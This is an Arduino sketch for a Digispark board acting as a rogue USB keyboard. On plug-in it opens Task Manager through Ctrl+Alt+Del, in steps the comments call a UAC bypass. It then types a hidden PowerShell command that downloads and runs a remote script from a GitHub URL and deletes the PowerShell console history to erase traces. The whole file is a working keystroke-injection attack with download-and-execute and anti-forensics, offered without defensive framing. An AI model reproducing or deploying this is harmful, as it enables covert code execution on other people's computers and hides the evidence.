#include "DigiKeyboard.h"

void setup() {

 // setup LED 
//
  pinMode(1, OUTPUT);

// flush keyboard
//
  Keyboard.update();
  Keyboard.sendKeyStroke(0);
  Keyboard.delay(100);

// start UAC Bypass
//
  Keyboard.sendKeyStroke(KEY_DEL, MOD_CTRL_RIGHT | MOD_ALT_RIGHT);
  Keyboard.delay(500);
  Keyboard.sendKeyStroke(KEY_TAB);
  Keyboard.delay(50);
  Keyboard.sendKeyStroke(KEY_TAB);
  Keyboard.delay(50);
  Keyboard.sendKeyStroke(KEY_TAB);
  Keyboard.delay(50);
  Keyboard.sendKeyStroke(KEY_TAB);
  Keyboard.delay(50);
  Keyboard.sendKeyStroke(KEY_ENTER);
  Keyboard.delay(500);
  Keyboard.sendKeyStroke(KEY_F, MOD_ALT_RIGHT);
  Keyboard.delay(50);
  Keyboard.sendKeyStroke(KEY_N);
  Keyboard.delay(100);

// enter commands to be run as administrator
//
  Keyboard.write("powershell -windowstyle hidden -command \"IEX (iwr -useb http://raw.githubusercontent.com/ElijahCuff/Rubber-DigiKey/main/speedy.ps1);Remove-Item -Path \\\"$env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\\\";exit\"");
  Keyboard.delay(200);


// end UAC bypass
//
  Keyboard.sendKeyStroke(KEY_TAB);
  Keyboard.delay(200);  
  Keyboard.sendKeyStroke(KEY_SPACE);
  Keyboard.delay(200);
  Keyboard.sendKeyStroke(KEY_ENTER);
}


void loop() {
  // Start Light Flash Loop On Payload Delivery
  digitalWrite(1, HIGH);
  Keyboard.delay(100);
  digitalWrite(1, LOW);
  Keyboard.delay(200);
}
